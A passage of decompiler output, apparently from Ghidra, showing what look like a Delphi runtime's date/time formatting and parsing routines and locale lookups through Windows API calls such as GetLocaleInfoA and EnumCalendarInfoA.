                    FUN_00409c58(*(undefined4 **)(&DAT_004426fc + (uVar4 & 0xffff) * 4),
                                 extraout_EDX_10,extraout_ECX_12,iVar6);
                    local_8 = (undefined4 *)((int)local_8 + 2);
                  }
                  else {
                    FUN_00409c14((undefined4 *)&local_9,1,extraout_ECX_11,param_4);
                  }
                }
              }
            }
          }
          break;
        case 0x43:
          puVar8 = &stack0xfffffffc;
          FUN_00409cc4(uVar2,cVar10,uVar7,&stack0xfffffffc);
          iVar6 = param_4;
          uVar2 = FUN_00409fd8(DAT_00442684,extraout_EDX_11,puVar8,param_4);
          puVar8 = &stack0xfffffffc;
          FUN_00409d28(uVar2,extraout_DL_09,(char)iVar6,&stack0xfffffffc);
          if (((local_1a != 0) || (local_1c != 0)) || (local_1e != 0)) {
            iVar6 = param_4;
            FUN_00409c14((undefined4 *)&DAT_0040a788,1,puVar8,param_4);
            FUN_00409fd8(DAT_0044269c,extraout_EDX_12,iVar6,param_4);
          }
          break;
        case 0x44:
          puVar8 = &stack0xfffffffc;
          FUN_00409cc4(uVar2,cVar10,uVar7,&stack0xfffffffc);
          iVar6 = local_10 + -3;
          if (local_10 - 1U < 2) {
            puVar15 = &stack0xfffffffc;
            FUN_00409cf0((char)iVar6,(char)extraout_EDX_02,(char)puVar8,&stack0xfffffffc);
            FUN_00409c78((uint)local_16,local_10,puVar15,param_4);
          }
          else if (iVar6 == 0) {
            iVar6 = param_4;
            uVar4 = FUN_00409b88(param_4,extraout_EDX_02,puVar8,*(undefined4 *)(param_4 + 8),
                                 *(undefined4 *)(param_4 + 0xc));
            FUN_00409c58(*(undefined4 **)(&DAT_004426fc + (uVar4 & 0xffff) * 4),extraout_EDX_03,
                         extraout_ECX_01,iVar6);
          }
          else if (local_10 == 4) {
            iVar6 = param_4;
            uVar4 = FUN_00409b88(param_4,extraout_EDX_02,puVar8,*(undefined4 *)(param_4 + 8),
                                 *(undefined4 *)(param_4 + 0xc));
            FUN_00409c58(*(undefined4 **)(&DAT_00442718 + (uVar4 & 0xffff) * 4),extraout_EDX_04,
                         extraout_ECX_02,iVar6);
          }
          else if (iVar6 == 2) {
            FUN_00409fd8(DAT_00442684,extraout_EDX_02,puVar8,param_4);
          }
          else {
            FUN_00409fd8(DAT_00442688,extraout_EDX_02,puVar8,param_4);
          }
          break;
        case 0x45:
          uVar14 = (char)&stack0xfffffffc;
          uVar2 = FUN_00409cc4(uVar2,cVar10,uVar7,&stack0xfffffffc);
          puVar15 = &stack0xfffffffc;
          FUN_00409cf0(uVar2,extraout_DL_01,uVar14,&stack0xfffffffc);
          puVar8 = &stack0xfffffffc;
          iVar6 = param_4;
          FUN_00409ed0(local_10,(char **)&local_2c,puVar15,(int)&stack0xfffffffc);
          FUN_00409c58(local_2c,extraout_EDX_00,puVar8,iVar6);
          break;
        case 0x47:
          uVar14 = (char)&stack0xfffffffc;
          uVar2 = FUN_00409cc4(uVar2,cVar10,uVar7,&stack0xfffffffc);
          puVar15 = &stack0xfffffffc;
          FUN_00409cf0(uVar2,extraout_DL_00,uVar14,&stack0xfffffffc);
          puVar8 = &stack0xfffffffc;
          iVar6 = param_4;
          FUN_00409d68(local_10,(int *)&local_28,puVar15,(int)&stack0xfffffffc);
          FUN_00409c58(local_28,extraout_EDX,puVar8,iVar6);
          break;
        case 0x48:
          uVar14 = (char)&stack0xfffffffc;
          uVar2 = FUN_00409cc4(uVar2,cVar10,uVar7,&stack0xfffffffc);
          puVar8 = &stack0xfffffffc;
          FUN_00409d28(uVar2,extraout_DL_03,uVar14,&stack0xfffffffc);
          local_23 = 0;
          puVar5 = local_8;
          while (bVar1 = *(byte *)puVar5, bVar1 != 0) {
            if ((*(byte *)((int)&DAT_0043f134 + ((int)(uint)bVar1 >> 3)) >> (bVar1 & 7) & 1) == 0) {
              bVar1 = *(byte *)puVar5;
              if (bVar1 < 0x49) {
                if (bVar1 == 0x48) break;
                if ((bVar1 == 0x22) || (bVar1 == 0x27)) {
                  local_23 = local_23 ^ 1;
                }
                else if (bVar1 == 0x41) goto LAB_0040a34a;
              }
              else if (bVar1 == 0x61) {
LAB_0040a34a:
                if (local_23 == 0) {
                  iVar6 = FUN_00408a3c((char *)puVar5,"AM/PM",5);
                  puVar8 = extraout_ECX_04;
                  if (((iVar6 == 0) ||
                      (iVar6 = FUN_00408a3c((char *)puVar5,"A/P",3), puVar8 = extraout_ECX_05,
                      iVar6 == 0)) ||
                     (iVar6 = FUN_00408a3c((char *)puVar5,"AMPM",4), puVar8 = extraout_ECX_06,
                     iVar6 == 0)) {
                    local_22 = '\x01';
                  }
                  break;
                }
              }
              else if (bVar1 == 0x68) break;
              puVar5 = (undefined4 *)((int)puVar5 + 1);
            }
            else {
              puVar5 = (undefined4 *)FUN_0040c394((LPCSTR)puVar5);
              puVar8 = extraout_ECX_03;
            }
          }
          uVar3 = local_1a;
          if (local_22 != '\0') {
            if (local_1a == 0) {
              uVar3 = 0xc;
            }
            else if (0xc < local_1a) {
              uVar3 = local_1a - 0xc;
            }
          }
          if (2 < local_10) {
            local_10 = 2;
          }
          FUN_00409c78((uint)uVar3,local_10,puVar8,param_4);
          break;
        case 0x4d:
          uVar14 = (char)&stack0xfffffffc;
          uVar2 = FUN_00409cc4(uVar2,cVar10,uVar7,&stack0xfffffffc);
          puVar8 = &stack0xfffffffc;
          FUN_00409cf0(uVar2,extraout_DL_02,uVar14,&stack0xfffffffc);
          if (local_10 - 1U < 2) {
            FUN_00409c78((uint)local_14,local_10,puVar8,param_4);
          }
          else if (local_10 - 1U == 2) {
            FUN_00409c58((&DAT_0044269c)[local_14],extraout_EDX_01,puVar8,param_4);
          }
          else {
            FUN_00409c58(*(undefined4 **)(&DAT_004426cc + (uint)local_14 * 4),extraout_EDX_01,puVar8
                         ,param_4);
          }
          break;
        case 0x4e:
          uVar14 = (char)&stack0xfffffffc;
          uVar2 = FUN_00409cc4(uVar2,cVar10,uVar7,&stack0xfffffffc);
          puVar8 = &stack0xfffffffc;
          FUN_00409d28(uVar2,extraout_DL_04,uVar14,&stack0xfffffffc);
          if (2 < local_10) {
            local_10 = 2;
          }
          FUN_00409c78((uint)local_1c,local_10,puVar8,param_4);
          break;
        case 0x53:
          uVar14 = (char)&stack0xfffffffc;
          uVar2 = FUN_00409cc4(uVar2,cVar10,uVar7,&stack0xfffffffc);
          puVar8 = &stack0xfffffffc;
          FUN_00409d28(uVar2,extraout_DL_05,uVar14,&stack0xfffffffc);
          if (2 < local_10) {
            local_10 = 2;
          }
          FUN_00409c78((uint)local_1e,local_10,puVar8,param_4);
          break;
        case 0x54:
          puVar8 = &stack0xfffffffc;
          FUN_00409cc4(uVar2,cVar10,uVar7,&stack0xfffffffc);
          if (local_10 == 1) {
            FUN_00409fd8(DAT_00442698,extraout_EDX_05,puVar8,param_4);
          }
          else {
            FUN_00409fd8(DAT_0044269c,extraout_EDX_05,puVar8,param_4);
          }
          break;
        case 0x59:
          uVar14 = (char)&stack0xfffffffc;
          uVar2 = FUN_00409cc4(uVar2,cVar10,uVar7,&stack0xfffffffc);
          puVar8 = &stack0xfffffffc;
          FUN_00409cf0(uVar2,extraout_DL,uVar14,&stack0xfffffffc);
          if (local_10 < 3) {
            FUN_00409c78((uint)local_12 % 100,2,100,param_4);
          }
          else {
            FUN_00409c78((uint)local_12,4,puVar8,param_4);
          }
          break;
        case 0x5a:
          uVar14 = (char)&stack0xfffffffc;
          uVar2 = FUN_00409cc4(uVar2,cVar10,uVar7,&stack0xfffffffc);
          puVar8 = &stack0xfffffffc;
          FUN_00409d28(uVar2,extraout_DL_06,uVar14,&stack0xfffffffc);
          if (3 < local_10) {
            local_10 = 3;
          }
          FUN_00409c78((uint)local_20,local_10,puVar8,param_4);
        }
      }
      else {
        iVar6 = param_4;
        uVar4 = FUN_0040c374((LPCSTR)local_8);
        FUN_00409c14(local_8,uVar4,extraout_ECX,iVar6);
        local_8 = (undefined4 *)FUN_0040c394((LPCSTR)local_8);
        bVar12 = 0x20;
      }
    }
    *(int *)(param_4 + -0x108) = *(int *)(param_4 + -0x108) + -1;
  }
  *in_FS_OFFSET = uStack64;
  puStack56 = &LAB_0040a760;
  puStack60 = (undefined *)0x40a758;
  FUN_004047cc((int *)&local_2c,2);
  return;
}



void FUN_0040a78c(int *param_1,undefined4 *param_2,undefined4 param_3)

{
  undefined4 local_104 [64];
  
  if (param_2 == (undefined4 *)0x0) {
    FUN_00409fd8((undefined4 *)&DAT_0040a7e4,0,param_3,(int)&stack0xfffffffc);
  }
  else {
    FUN_00409fd8(param_2,param_2,param_3,(int)&stack0xfffffffc);
  }
  FUN_00404898(param_1,local_104,0);
  return;
}



void FUN_0040a7e8(int *param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
                 undefined4 param_5)

{
  FUN_0040a78c(param_1,(undefined4 *)0x0,param_3);
  return;
}



void FUN_0040a7fc(int param_1,int *param_2)

{
  int iVar1;
  int iVar2;
  
  iVar2 = *param_2;
  while( true ) {
    iVar1 = FUN_00404a68(param_1);
    if ((iVar1 < iVar2) || (*(char *)(param_1 + -1 + iVar2) != ' ')) break;
    iVar2 = iVar2 + 1;
  }
  *param_2 = iVar2;
  return;
}



uint FUN_0040a820(int param_1,int *param_2,int *param_3,char *param_4)

{
  ushort uVar1;
  int iVar2;
  int iVar3;
  
  *param_4 = '\0';
  FUN_0040a7fc(param_1,param_2);
  iVar3 = *param_2;
  uVar1 = 0;
  while( true ) {
    iVar2 = FUN_00404a68(param_1);
    if (((iVar2 < iVar3) || (9 < (byte)(*(char *)(param_1 + -1 + iVar3) - 0x30U))) || (999 < uVar1))
    break;
    uVar1 = uVar1 * 10 + (*(byte *)(param_1 + -1 + iVar3) - 0x30);
    iVar3 = iVar3 + 1;
  }
  iVar2 = *param_2;
  if (iVar2 < iVar3) {
    *param_4 = (char)iVar3 - (char)*param_2;
    *param_2 = iVar3;
    *(ushort *)param_3 = uVar1;
    param_2 = param_3;
  }
  return (uint)param_2 & 0xffffff00 | (uint)(iVar2 < iVar3);
}



void FUN_0040a8b4(int param_1,int *param_2,undefined *param_3)

{
  uint uVar1;
  int iVar2;
  undefined4 *in_FS_OFFSET;
  undefined **ppuVar3;
  undefined4 uStack36;
  undefined *puStack32;
  undefined *puStack28;
  undefined *local_c;
  int local_8;
  
  puStack28 = &stack0xfffffffc;
  local_c = (undefined *)0x0;
  puStack32 = &LAB_0040a92d;
  uStack36 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack36;
  local_8 = param_1;
  if (param_3 != (undefined *)0x0) {
    FUN_0040a7fc(param_1,param_2);
    ppuVar3 = &local_c;
    uVar1 = FUN_00404a68((int)param_3);
    FUN_00404cc8(local_8,*param_2,uVar1,(int *)ppuVar3);
    iVar2 = FUN_00407f50(param_3,local_c);
    if (iVar2 == 0) {
      iVar2 = FUN_00404a68((int)param_3);
      *param_2 = *param_2 + iVar2;
    }
  }
  *in_FS_OFFSET = uStack36;
  puStack28 = &LAB_0040a934;
  puStack32 = (undefined *)0x40a92c;
  FUN_004047a8((int *)&local_c);
  return;
}



undefined4 FUN_0040a940(int param_1,int *param_2,char param_3)

{
  int iVar1;
  undefined4 uVar2;
  
  uVar2 = 0;
  FUN_0040a7fc(param_1,param_2);
  iVar1 = FUN_00404a68(param_1);
  if ((*param_2 <= iVar1) && (*(char *)(param_1 + -1 + *param_2) == param_3)) {
    *param_2 = *param_2 + 1;
    uVar2 = 1;
  }
  return uVar2;
}



undefined4 FUN_0040a978(int param_1)

{
  byte bVar1;
  int iVar2;
  int iVar3;
  
  iVar3 = 1;
  while( true ) {
    iVar2 = FUN_00404a68(param_1);
    if (iVar2 < iVar3) {
      return 0;
    }
    bVar1 = *(byte *)(param_1 + -1 + iVar3) & 0xdf;
    if (bVar1 == 0x44) {
      return 1;
    }
    if (bVar1 == 0x45) {
      return 2;
    }
    if (bVar1 == 0x4d) break;
    if (bVar1 == 0x59) {
      return 2;
    }
    iVar3 = iVar3 + 1;
  }
  return 0;
}



uint FUN_0040a9c4(undefined *param_1,uint *param_2)

{
  uint uVar1;
  
  while( true ) {
    uVar1 = FUN_00404a68((int)param_1);
    if (((int)uVar1 < (int)*param_2) ||
       (uVar1 = *param_2 & 0xffffff00 | (uint)(byte)(param_1[*param_2 - 1] - 0x3a),
       (byte)(param_1[*param_2 - 1] - 0x30) < 10)) break;
    if ((*(byte *)((int)&DAT_0043f134 + ((int)(uint)(byte)param_1[*param_2 - 1] >> 3)) >>
         ((byte)param_1[*param_2 - 1] & 7) & 1) == 0) {
      *param_2 = *param_2 + 1;
    }
    else {
      uVar1 = FUN_0040c3d8(param_1,*param_2);
      *param_2 = uVar1;
    }
  }
  return uVar1;
}



undefined4 FUN_0040aa0c(undefined *param_1)

{
  char *pcVar1;
  byte *pbVar2;
  PCNZCH pCVar3;
  int *piVar4;
  undefined4 *puVar5;
  int iVar6;
  
  iVar6 = 7;
  piVar4 = &DAT_00442748;
  puVar5 = &DAT_00442764;
  while( true ) {
    if (*piVar4 == 0) {
      return 0;
    }
    pcVar1 = FUN_00404c68(param_1);
    pbVar2 = FUN_00404c68((undefined *)*piVar4);
    pCVar3 = FUN_0040c544(pbVar2,pcVar1);
    if (pCVar3 != (PCNZCH)0x0) break;
    puVar5 = puVar5 + 1;
    piVar4 = piVar4 + 1;
    iVar6 = iVar6 + -1;
    if (iVar6 == 0) {
      return 0;
    }
  }
  return *puVar5;
}



int FUN_0040aa60(int param_1,undefined4 param_2,undefined4 param_3,int param_4)

{
  WORD WVar1;
  uint uVar2;
  
  if (DAT_0044273c == 0x12) {
    if (param_1 < 100) {
      WVar1 = FUN_00409c00();
      uVar2 = (int)*(uint *)(param_4 + -4) >> 0x1f;
      param_1 = param_1 + ((int)((uint)WVar1 + ((*(uint *)(param_4 + -4) ^ uVar2) - uVar2)) / 100) *
                          100;
    }
    if (0 < *(int *)(param_4 + -4)) {
      *(int *)(param_4 + -4) = -*(int *)(param_4 + -4);
    }
  }
  else {
    *(int *)(param_4 + -4) = *(int *)(param_4 + -4) + -1;
  }
  return *(int *)(param_4 + -4) + param_1;
}



void FUN_0040aabc(undefined *param_1,uint *param_2,double *param_3)

{
  WORD WVar1;
  undefined4 uVar2;
  PCNZCH pCVar3;
  uint uVar4;
  undefined2 extraout_var;
  char *pcVar5;
  int iVar6;
  undefined4 extraout_ECX;
  undefined4 extraout_EDX;
  ushort uVar7;
  uint uVar8;
  undefined4 *in_FS_OFFSET;
  undefined **ppuVar9;
  undefined4 uStack68;
  undefined *puStack64;
  undefined *puStack60;
  undefined *local_2c;
  undefined *local_28;
  int local_24;
  undefined *local_20;
  byte local_1c;
  byte local_1b;
  char local_1a;
  byte local_19;
  ushort local_18;
  ushort local_16;
  ushort local_14;
  ushort local_12;
  ushort local_10;
  char local_e;
  undefined local_d;
  double *local_c;
  int local_8;
  
  puStack60 = &stack0xfffffffc;
  local_2c = (undefined *)0x0;
  local_28 = (undefined *)0x0;
  local_24 = 0;
  local_20 = (undefined *)0x0;
  puStack64 = &LAB_0040add7;
  uStack68 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack68;
  uVar8 = 0;
  local_16 = 0;
  local_18 = 0;
  local_1c = 0;
  local_d = 0;
  local_c = param_3;
  uVar2 = FUN_0040a978((int)DAT_00442684);
  local_e = (char)uVar2;
  local_8 = 0;
  if ((DAT_00442684 == (char *)0x0) || (*DAT_00442684 != 'g')) {
    pCVar3 = FUN_0040c480(&DAT_0040adf0,DAT_00442684);
    if (0 < (int)pCVar3) {
      local_8 = DAT_00442764;
    }
  }
  else {
    FUN_0040a9c4(param_1,param_2);
    FUN_00404cc8((int)param_1,1,*param_2 - 1,&local_24);
    FUN_00407fa0(local_24,(int *)&local_20);
    local_8 = FUN_0040aa0c(local_20);
  }
  uVar4 = FUN_0040a820((int)param_1,(int *)param_2,(int *)&local_10,(char *)&local_19);
  if ((((char)uVar4 != '\0') &&
      (uVar2 = FUN_0040a940((int)param_1,(int *)param_2,DAT_00442681), (char)uVar2 != '\0')) &&
     (uVar4 = FUN_0040a820((int)param_1,(int *)param_2,(int *)&local_12,&local_1a),
     (char)uVar4 != '\0')) {
    uVar2 = FUN_0040a940((int)param_1,(int *)param_2,DAT_00442681);
    if ((char)uVar2 == '\0') {
      WVar1 = FUN_00409c00();
      uVar8 = CONCAT22(extraout_var,WVar1);
      if (local_e == '\x01') {
        local_18 = local_10;
        local_16 = local_12;
      }
      else {
        local_16 = local_10;
        local_18 = local_12;
      }
    }
    else {
      uVar4 = FUN_0040a820((int)param_1,(int *)param_2,(int *)&local_14,(char *)&local_1b);
      if ((char)uVar4 == '\0') goto LAB_0040adbc;
      if (local_e == '\0') {
        uVar8 = (uint)local_14;
        local_1c = local_1b;
        local_16 = local_10;
        local_18 = local_12;
      }
      else if (local_e == '\x01') {
        uVar8 = (uint)local_14;
        local_1c = local_1b;
        local_16 = local_12;
        local_18 = local_10;
      }
      else if (local_e == '\x02') {
        uVar8 = (uint)local_10;
        local_1c = local_19;
        local_16 = local_12;
        local_18 = local_14;
      }
      if (local_8 < 1) {
        if (local_1c < 3) {
          WVar1 = FUN_00409c00();
          uVar7 = (short)uVar8 + (short)((int)((uint)WVar1 - (uint)DAT_0043f100) / 100) * 100;
          uVar8 = (uint)uVar7;
          if ((DAT_0043f100 != 0) && ((int)uVar8 < (int)((uint)WVar1 - (uint)DAT_0043f100))) {
            uVar8 = (uint)(ushort)(uVar7 + 100);
          }
        }
      }
      else {
        uVar8 = FUN_0040aa60(uVar8,extraout_EDX,extraout_ECX,(int)&stack0xfffffffc);
      }
    }
    FUN_0040a940((int)param_1,(int *)param_2,DAT_00442681);
    FUN_0040a7fc((int)param_1,(int *)param_2);
    if ((DAT_00442744 != '\0') && (pcVar5 = FUN_00404d50("ddd",DAT_00442684), pcVar5 != (char *)0x0)
       ) {
      if ((byte)(*DAT_00442698 - 0x30U) < 10) {
        FUN_0040a9c4(param_1,param_2);
      }
      else {
        do {
          while ((iVar6 = FUN_00404a68((int)param_1), (int)*param_2 <= iVar6 &&
                 (param_1[*param_2 - 1] != ' '))) {
            *param_2 = *param_2 + 1;
          }
          FUN_0040a7fc((int)param_1,(int *)param_2);
          iVar6 = FUN_00404a68((int)param_1);
          if (iVar6 < (int)*param_2) break;
          ppuVar9 = &local_28;
          uVar4 = FUN_00404a68((int)DAT_00442690);
          FUN_00404cc8((int)param_1,*param_2,uVar4,(int *)ppuVar9);
          iVar6 = FUN_00407f50(DAT_00442690,local_28);
          if (iVar6 == 0) break;
          ppuVar9 = &local_2c;
          uVar4 = FUN_00404a68((int)DAT_00442694);
          FUN_00404cc8((int)param_1,*param_2,uVar4,(int *)ppuVar9);
          iVar6 = FUN_00407f50(DAT_00442694,local_2c);
        } while (iVar6 != 0);
      }
    }
    uVar8 = FUN_00409924(uVar8,local_16,local_18,local_c);
    local_d = (undefined)uVar8;
  }
LAB_0040adbc:
  *in_FS_OFFSET = uStack68;
  puStack60 = &LAB_0040adde;
  puStack64 = (undefined *)0x40add6;
  FUN_004047cc((int *)&local_2c,4);
  return;
}



uint FUN_0040ae00(int param_1,int *param_2,double *param_3)

{
  char cVar1;
  uint uVar2;
  undefined4 uVar3;
  int iVar4;
  ushort local_1c;
  ushort local_1a;
  ushort local_18;
  ushort local_16;
  char local_14 [4];
  
  iVar4 = -1;
  cVar1 = FUN_0040a8b4(param_1,param_2,DAT_00442690);
  if ((cVar1 == '\0') && (cVar1 = FUN_0040a8b4(param_1,param_2,&DAT_0040afe4), cVar1 == '\0')) {
    cVar1 = FUN_0040a8b4(param_1,param_2,DAT_00442694);
    if ((cVar1 != '\0') || (cVar1 = FUN_0040a8b4(param_1,param_2,&DAT_0040aff0), cVar1 != '\0')) {
      iVar4 = 0xc;
    }
  }
  else {
    iVar4 = 0;
  }
  if (-1 < iVar4) {
    FUN_0040a7fc(param_1,param_2);
  }
  uVar2 = FUN_0040a820(param_1,param_2,(int *)&local_1c,local_14);
  if ((char)uVar2 == '\0') {
    return 0;
  }
  local_1a = 0;
  local_18 = 0;
  local_16 = 0;
  uVar3 = FUN_0040a940(param_1,param_2,DAT_0044268c);
  if ((char)uVar3 != '\0') {
    uVar2 = FUN_0040a820(param_1,param_2,(int *)&local_1a,local_14);
    if ((char)uVar2 == '\0') {
      return 0;
    }
    uVar3 = FUN_0040a940(param_1,param_2,DAT_0044268c);
    if ((char)uVar3 != '\0') {
      uVar2 = FUN_0040a820(param_1,param_2,(int *)&local_18,local_14);
      if ((char)uVar2 == '\0') {
        return 0;
      }
      uVar3 = FUN_0040a940(param_1,param_2,DAT_0044267f);
      if (((char)uVar3 != '\0') &&
         (uVar2 = FUN_0040a820(param_1,param_2,(int *)&local_16,local_14), (char)uVar2 == '\0')) {
        return 0;
      }
    }
  }
  if (iVar4 < 0) {
    cVar1 = FUN_0040a8b4(param_1,param_2,DAT_00442690);
    if ((cVar1 == '\0') && (cVar1 = FUN_0040a8b4(param_1,param_2,&DAT_0040afe4), cVar1 == '\0')) {
      cVar1 = FUN_0040a8b4(param_1,param_2,DAT_00442694);
      if ((cVar1 != '\0') || (cVar1 = FUN_0040a8b4(param_1,param_2,&DAT_0040aff0), cVar1 != '\0')) {
        iVar4 = 0xc;
      }
    }
    else {
      iVar4 = 0;
    }
  }
  if (-1 < iVar4) {
    if (local_1c == 0) {
      return 0;
    }
    if (0xc < local_1c) {
      return 0;
    }
    if (local_1c == 0xc) {
      local_1c = 0;
    }
    local_1c = local_1c + (short)iVar4;
  }
  FUN_0040a7fc(param_1,param_2);
  uVar2 = FUN_004097dc((double *)((uint)param_3 & 0xffff0000 | (uint)local_1c),local_1a,local_18,
                       param_3,local_16);
  return uVar2;
}



undefined4 FUN_0040aff4(int param_1,double *param_2)

{
  uint uVar1;
  int iVar2;
  int local_c;
  
  local_c = 1;
  uVar1 = FUN_0040ae00(param_1,&local_c,param_2);
  if (((char)uVar1 != '\0') && (iVar2 = FUN_00404a68(param_1), iVar2 < local_c)) {
    return CONCAT31((int3)((uint)iVar2 >> 8),1);
  }
  return 0;
}



undefined4 FUN_0040b028(undefined *param_1,double *param_2)

{
  char cVar1;
  int iVar2;
  uint uVar3;
  undefined4 uVar4;
  undefined4 unaff_EBX;
  uint local_24 [2];
  double local_1c;
  undefined4 local_14;
  undefined4 uStack16;
  
  uVar4 = CONCAT31((int3)((uint)unaff_EBX >> 8),1);
  local_24[0] = 1;
  local_14 = 0;
  uStack16 = 0;
  cVar1 = FUN_0040aabc(param_1,local_24,&local_1c);
  if (cVar1 == '\0') {
LAB_0040b073:
    uVar4 = FUN_0040aff4((int)param_1,param_2);
  }
  else {
    iVar2 = FUN_00404a68((int)param_1);
    if ((int)local_24[0] <= iVar2) {
      uVar3 = FUN_0040ae00((int)param_1,(int *)local_24,(double *)&local_14);
      if ((char)uVar3 == '\0') goto LAB_0040b073;
    }
    if (local_1c < 0.0) {
      *param_2 = local_1c - (double)CONCAT44(uStack16,local_14);
    }
    else {
      *param_2 = local_1c + (double)CONCAT44(uStack16,local_14);
    }
  }
  return uVar4;
}



void FUN_0040b0b4(DWORD param_1,int *param_2)

{
  byte bVar1;
  uint uVar2;
  undefined4 local_104 [64];
  
  uVar2 = FormatMessageA(0x3200,(LPCVOID)0x0,param_1,0,(LPSTR)local_104,0x100,(va_list *)0x0);
  for (; (0 < (int)uVar2 &&
         ((bVar1 = *(byte *)((int)local_104 + (uVar2 - 1)), bVar1 < 0x21 || (bVar1 == 0x2e))));
      uVar2 = uVar2 - 1) {
  }
  FUN_00404898(param_2,local_104,uVar2);
  return;
}



void FUN_0040b100(LCID param_1,LCTYPE param_2,undefined4 *param_3,int *param_4)

{
  int iVar1;
  undefined4 local_104 [64];
  
  iVar1 = GetLocaleInfoA(param_1,param_2,(LPSTR)local_104,0x100);
  if (iVar1 < 1) {
    FUN_004047fc(param_4,param_3);
  }
  else {
    FUN_00404898(param_4,local_104,iVar1 - 1);
  }
  return;
}



uint FUN_0040b14c(LCID param_1,LCTYPE param_2,uint param_3)

{
  uint uVar1;
  uint local_10;
  
  local_10 = param_3;
  uVar1 = GetLocaleInfoA(param_1,param_2,(LPSTR)&local_10,2);
  if (0 < (int)uVar1) {
    param_3 = uVar1 & 0xffffff00 | local_10 & 0xff;
  }
  return param_3;
}



void FUN_0040b174(LCTYPE param_1,int param_2,int param_3,int *param_4,undefined4 param_5,int param_6
                 )

{
  FUN_0040b100(*(LCID *)(param_6 + -4),param_1,(undefined4 *)0x0,param_4);
  if (*param_4 == 0) {
    FUN_0040658c(*(int ***)(param_3 + param_2 * 4),param_4);
  }
  return;
}



void FUN_0040b1b0(void)

{
  int iVar1;
  int *piVar2;
  int *piVar3;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack52;
  undefined *puStack48;
  undefined *puStack44;
  undefined4 *local_1c;
  undefined4 *local_18;
  undefined4 *local_14;
  undefined4 *local_10;
  int local_c;
  LCID local_8;
  
  puStack44 = &stack0xfffffffc;
  local_8 = 0;
  local_c = 0;
  local_10 = (undefined4 *)0x0;
  local_14 = (undefined4 *)0x0;
  local_18 = (undefined4 *)0x0;
  local_1c = (undefined4 *)0x0;
  puStack48 = &LAB_0040b2c3;
  uStack52 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack52;
  local_8 = GetThreadLocale();
  iVar1 = 1;
  piVar2 = (int *)&DAT_004426a0;
  piVar3 = (int *)&DAT_004426d0;
  do {
    FUN_0040b174(iVar1 + 0x43,iVar1 + -1,(int)&PTR_PTR_DAT_0043f1ac,(int *)&local_10,0xb,
                 (int)&stack0xfffffffc);
    FUN_004047fc(piVar2,local_10);
    FUN_0040b174(iVar1 + 0x37,iVar1 + -1,(int)&PTR_PTR_DAT_0043f1dc,(int *)&local_14,0xb,
                 (int)&stack0xfffffffc);
    FUN_004047fc(piVar3,local_14);
    iVar1 = iVar1 + 1;
    piVar3 = piVar3 + 1;
    piVar2 = piVar2 + 1;
  } while (iVar1 != 0xd);
  iVar1 = 1;
  piVar2 = (int *)&DAT_00442700;
  piVar3 = (int *)&DAT_0044271c;
  do {
    local_c = (iVar1 + 5) % 7;
    FUN_0040b174(local_c + 0x31,iVar1 + -1,(int)&PTR_PTR_DAT_0043f20c,(int *)&local_18,6,
                 (int)&stack0xfffffffc);
    FUN_004047fc(piVar2,local_18);
    FUN_0040b174(local_c + 0x2a,iVar1 + -1,(int)&PTR_PTR_DAT_0043f228,(int *)&local_1c,6,
                 (int)&stack0xfffffffc);
    FUN_004047fc(piVar3,local_1c);
    iVar1 = iVar1 + 1;
    piVar3 = piVar3 + 1;
    piVar2 = piVar2 + 1;
  } while (iVar1 != 8);
  *in_FS_OFFSET = uStack52;
  puStack44 = &LAB_0040b2ca;
  puStack48 = (undefined *)0x40b2c2;
  FUN_004047cc((int *)&local_1c,4);
  return;
}



void FUN_0040b388(void)

{
  LCID LVar1;
  byte *Calendar;
  undefined4 *puVar2;
  int extraout_ECX;
  int iVar3;
  undefined4 *in_FS_OFFSET;
  byte *Calendar_00;
  byte **ppbVar4;
  CALTYPE CVar5;
  undefined4 uStack24;
  undefined *puStack20;
  undefined *puStack16;
  byte *local_8;
  
  puStack16 = &stack0xfffffffc;
  local_8 = (byte *)0x0;
  puStack20 = &DAT_0040b41f;
  uStack24 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack24;
  ppbVar4 = &local_8;
  LVar1 = GetThreadLocale();
  FUN_0040b100(LVar1,0x100b,(undefined4 *)&DAT_0040b434,(int *)ppbVar4);
  Calendar = FUN_004081b4(local_8,(byte *)0x1,extraout_ECX);
  if (Calendar + -3 < (byte *)0x3) {
    CVar5 = 4;
    Calendar_00 = Calendar;
    LVar1 = GetThreadLocale();
    EnumCalendarInfoA((CALINFO_ENUMPROCA)&LAB_0040b2d4,LVar1,(CALID)Calendar_00,CVar5);
    iVar3 = 7;
    puVar2 = &DAT_00442764;
    do {
      *puVar2 = 0xffffffff;
      puVar2 = puVar2 + 1;
      iVar3 = iVar3 + -1;
    } while (iVar3 != 0);
    CVar5 = 3;
    LVar1 = GetThreadLocale();
    EnumCalendarInfoA((CALINFO_ENUMPROCA)&LAB_0040b310,LVar1,(CALID)Calendar,CVar5);
  }
  *in_FS_OFFSET = uStack24;
  puStack16 = &LAB_0040b426;
  puStack20 = (undefined *)0x40b41e;
  FUN_004047a8((int *)&local_8);
  return;
}



void FUN_0040b438(undefined4 *param_1,int *param_2)

{
  char cVar1;
  bool bVar2;
  LCID LVar3;
  byte *pbVar4;
  int iVar5;
  uint uVar6;
  int extraout_ECX;
  uint extraout_EDX;
  uint extraout_EDX_00;
  int iVar7;
  undefined4 *in_FS_OFFSET;
  byte **ppbVar8;
  undefined4 uStack48;
  undefined *puStack44;
  undefined *puStack40;
  undefined4 *local_18;
  undefined4 *local_14;
  undefined4 *local_10;
  byte *local_c;
  uint local_8;
  
  puStack40 = &stack0xfffffffc;
  local_8 = 0;
  local_c = (byte *)0x0;
  local_10 = (undefined4 *)0x0;
  local_14 = (undefined4 *)0x0;
  local_18 = (undefined4 *)0x0;
  puStack44 = &DAT_0040b602;
  uStack48 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack48;
  iVar7 = 1;
  FUN_004047a8(param_2);
  ppbVar8 = &local_c;
  LVar3 = GetThreadLocale();
  FUN_0040b100(LVar3,0x1009,(undefined4 *)&DAT_0040b618,(int *)ppbVar8);
  pbVar4 = FUN_004081b4(local_c,(byte *)0x1,extraout_ECX);
  if (pbVar4 + -3 < (byte *)0x3) {
    while (iVar5 = FUN_00404a68((int)param_1), iVar7 <= iVar5) {
      uVar6 = (uint)*(byte *)((int)param_1 + iVar7 + -1);
